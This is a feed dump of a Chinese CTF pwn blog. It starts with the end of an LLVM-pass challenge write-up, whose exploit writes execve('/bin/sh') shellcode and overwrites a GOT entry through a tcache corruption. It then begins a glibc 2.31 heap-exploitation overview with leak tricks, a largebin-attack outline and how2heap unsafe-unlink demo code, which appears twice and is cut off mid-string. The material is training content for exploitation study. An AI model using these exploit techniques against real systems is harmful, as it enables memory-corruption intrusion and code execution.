class="number">0x10000</span>) = **((_DWORD **)&amp;addrList + v31);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator++(&amp;v65);</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">true</span>&gt;::operator++(&amp;v67);</span><br><span class="line">  &#125;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v72 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现了一个类似菜单堆的面板，通过Alloc可以分配一块位于0x10000的可执行区域，在此写入shellcode，Edit存在溢出，可以使用负偏移从而改写tcache管理结构体，这里考虑将0x40的链表改写成oprator delete(void*) 的got表的位置，并且将其剩余数量改写为1，以防止继续分配coredump，之后覆写got表为0x10000。</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> size)</span>;</span><br><span class="line"><span class="comment">// Add any size</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Del</span><span class="params">(<span class="type">int</span> idx)</span>;</span><br><span class="line"><span class="comment">// Del</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Edit</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> offset, <span class="type">unsigned</span> <span class="type">int</span> num)</span>;</span><br><span class="line"><span class="comment">// Alloc</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Alloc</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">EditAlloc</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> offset)</span>;</span><br><span class="line"><span class="comment">// write got</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;\x48\x31\xf6\x56</span></span><br><span class="line"><span class="comment">0x56f63148</span></span><br><span class="line"><span class="comment">\x48\xbf\x2f\x62</span></span><br><span class="line"><span class="comment">0x622fbf48</span></span><br><span class="line"><span class="comment">\x69\x6e\x2f\x2f</span></span><br><span class="line"><span class="comment">0x2f2f6e69</span></span><br><span class="line"><span class="comment">\x73\x68\x57\x54&quot;</span></span><br><span class="line"><span class="comment">0x54576873</span></span><br><span class="line"><span class="comment">&quot;\x5f\xb0\x3b\x99</span></span><br><span class="line"><span class="comment">0x993bb05f</span></span><br><span class="line"><span class="comment">\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 0</span></span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x56f63148</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 1</span></span><br><span class="line">    Edit(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0x622fbf48</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 2</span></span><br><span class="line">    Edit(<span class="number">2</span>, <span class="number">0</span>, <span class="number">0x2f2f6e69</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 3</span></span><br><span class="line">    Edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x54576873</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 4</span></span><br><span class="line">    Edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0x993bb05f</span>);</span><br><span class="line">    Add(<span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line">    Edit(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0x050f</span>);</span><br><span class="line">    Alloc();</span><br><span class="line">    EditAlloc(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    EditAlloc(<span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    EditAlloc(<span class="number">2</span>, <span class="number">4</span> * <span class="number">2</span>);</span><br><span class="line">    EditAlloc(<span class="number">3</span>, <span class="number">4</span> * <span class="number">3</span>);</span><br><span class="line">    EditAlloc(<span class="number">4</span>, <span class="number">4</span> * <span class="number">4</span>);</span><br><span class="line">    EditAlloc(<span class="number">5</span>, <span class="number">4</span> * <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// set tcache 0x40 num and link</span></span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">-0x25d6f</span>, <span class="number">1</span>);</span><br><span class="line">    Edit(<span class="number">0</span>, <span class="number">-0x25d4c</span>, (<span class="number">0x78B000</span>));</span><br><span class="line">    <span class="comment">// make opretor delete got to 0x10000</span></span><br><span class="line">    Add(<span class="number">0x30</span>); <span class="comment">// 6</span></span><br><span class="line">    Edit(<span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    Edit(<span class="number">6</span>, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="comment">// Add(0);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;overview&quot;&gt;overview&lt;/h1&gt;
&lt;p&gt;华中赛遇到了一个llvm的题，顺手系统总结一下llvm pass吧。&lt;/p&gt;
&lt;p&gt;首先简单介绍一下llvm，llvm是一套用C++编写的编译器基础设施。LLVM Pass提供了一些可供重写的函数，本义是用来实现一些优化。而Pwn的llvm pass类题，就是重写了runOnFunction函数。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://v3rdant.cn/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://v3rdant.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwn.Heap-Exploation-up-to-2.31</title>
    <link href="https://v3rdant.cn/Pwn.Heap-Exploation-up-to-2.31/"/>
    <id>https://v3rdant.cn/Pwn.Heap-Exploation-up-to-2.31/</id>
    <published>2023-06-20T16:00:00.000Z</published>
    <updated>2024-03-04T07:37:44.361Z</updated>
    
    <content type="html"><![CDATA[<p>关于heap我所知道的一切</p><span id="more"></span><h1 id="Basic-Knowledge">Basic Knowledge</h1><h6 id="bins">bins:</h6><table><thead><tr><th>unsorted bin</th><th>fast bin</th><th>small bin</th><th>large bin</th></tr></thead><tbody><tr><td>NO LIMITATION</td><td>0x20-0x80</td><td>&lt;0x400</td><td>&gt;0x400</td></tr></tbody></table><h2 id="libc-version">libc version</h2><p>ubuntu-libc version</p><ul><li>2.23=“16.04”</li><li>2.24=“17.04”</li><li>2.26=“17.10”</li><li>2.27=“18.04”</li><li>2.28=“18.10”</li><li>2.29=“19.04”</li><li>2.30=“19.10”</li><li>2.31=“20.04”</li><li>2.32=“20.10”</li><li>2.33=“21.04”</li><li>2.34=“22.04”</li></ul><h1 id="Overview">Overview</h1><p>在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。</p><p>本文主要<strong>针对glibc2.30及以上</strong>有着tcache的版本。<s>因为低于2.27版本的堆笔者根本不会</s></p><p>正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。</p><p>在笔者看来，一次堆利用主要分为一下几个步骤：</p><ul><li>漏洞的发现</li><li>地址的泄露</li><li>利用漏洞控制目标地址内容</li><li>攻击的对象</li></ul><p>因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。</p><p>笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， <s>才不是因为笔者懒呢</s> ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。</p><h1 id="基本漏洞">基本漏洞</h1><p><strong>UAF</strong><br>在free时没有清空指针，可以重利用指针。<br>在没有<code>Edit</code> 的情况下，可以通过 <code>double free</code> 进行堆块重叠。</p><p><strong>overflow</strong><br>溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用</p><p><strong>off-by-one</strong>/<strong>off-by-null</strong><br>这里主要针对2.29-2.31版本, <a href="https://www.anquanke.com/post/id/236078#h3-4">2.29-2.31版本的off-by-null</a> ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。</p><p><strong>漏洞的利用</strong><br>上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流<br>考虑:</p><ul><li>one gadget</li><li>system(“/bin/sh”)</li><li>orw</li></ul><h1 id="leak">leak</h1><p>一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。</p><p>一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。</p><p>也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。</p><p>此外，当释放进入unsorted bin后，申请一个从unsorted bin 切分下的 chunk，此时chunk头也会留有相应指针。</p><p>而在没有show相关输出chunk内容的函数时，考虑通过<code>_IO_2_1_stdout_</code> 来leak<br>基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak</p><h1 id="Basic-tricks-up-to-2-30">Basic tricks up to 2.30</h1><p>在2.30以上的版本，我认为需要掌握的基本技术主要包括:</p><ul><li>[x] largebin attack</li><li>[x] tcache stashing unlink attack</li><li>[x] unsafe unlink</li><li>[x] tcache poison</li><li>[x] house of botcake</li><li>[x] decrypt safe_unlink</li><li>[x] house of pig</li><li>[x] 堆布局</li></ul><p>这里结合how to heap源代码分析</p><h2 id="Largebin-attack">Largebin attack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sanity check</span></span><br><span class="line">assert(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>核心思路:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x420</span>) <span class="comment"># chunk A</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">malloc(<span class="number">0x410</span>) <span class="comment"># chunk B</span></span><br><span class="line"><span class="comment">#This chunk should be smaller than [p1] and belong to the same large bin</span></span><br><span class="line">malloc(<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#And another chunk to prevent consolidate</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line"><span class="comment">#Allocate a chunk larger than [p1] to insert [p1] into large bin</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#Free the smaller of the two --&gt; [p2]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span>+p64(target2-<span class="number">0x20</span>))</span><br><span class="line"><span class="comment">#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址</span></span><br><span class="line">malloc(<span class="number">0x438</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(recover)*<span class="number">2</span>) <span class="comment"># 修复large bin attack </span></span><br></pre></td></tr></table></figure><p><strong>修复:</strong><br>可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算</p><p><strong>限制:</strong></p><ul><li>需要一次UAF</li></ul><p><strong>效果:</strong></p><ul><li>在2.30以上可以在任意地址写入一个libc地址</li></ul><h2 id="unsafe-unlink">unsafe unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line"><span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake 